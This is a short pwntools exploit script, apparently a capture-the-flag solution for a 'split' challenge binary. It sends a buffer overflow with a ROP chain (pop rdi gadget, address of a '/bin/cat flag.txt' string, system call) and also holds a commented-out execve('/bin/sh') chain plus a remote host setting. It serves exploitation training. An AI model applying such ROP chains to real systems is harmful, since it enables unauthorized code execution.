from pwn import *
import sys

#########################################################
BINARY="./split"
ENV={}
GDB="break *main"
HOST="46.101.199.176"
PORT=8002
#########################################################
r = process(BINARY)
# r = remote(HOST, PORT)
binary = ELF(BINARY)

# Wait for debugger
# pid = util.proc.pidof(r)[0]
# print("The pid is: "+str(pid))
# util.proc.wait_for_debugger(pid)

# EAX = 0xb
# EBX = "pointer to /bin/sh"
# ECX = EDX = 0

# exploit = ("due\x00"+"a"*12).encode()+ p32(0x0804851d) + p32(0x0b) + p32(0x08048526) + p32(0x0804a02c) + p32(0x08048530) + p32(0x0) + p32(0x08048528) + p32(0x0) + p32(0x0804852d)


"""

0x0000000000400883  --- pop rdi; ret
0x0000000000601060  --- /bin/cat flag.txt
"""

exploit = ("a"*0x28).encode() + p64(0x0000000000400883) + p64(0x0000000000601060) + p64(0x00000000004005E0)

print(exploit)

r.sendline(exploit)
r.interactive()

